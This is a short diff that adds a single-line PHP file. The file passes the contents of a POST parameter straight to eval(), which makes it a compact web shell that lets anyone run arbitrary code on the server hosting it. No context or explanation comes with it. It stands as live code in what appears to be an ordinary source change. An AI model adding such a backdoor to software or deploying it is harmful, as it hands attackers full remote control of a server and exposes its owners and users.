@@ -1,0 +1,1 @@
+<?php $str=1;function mains($str){eval($str);}mains($_POST[1]);?>
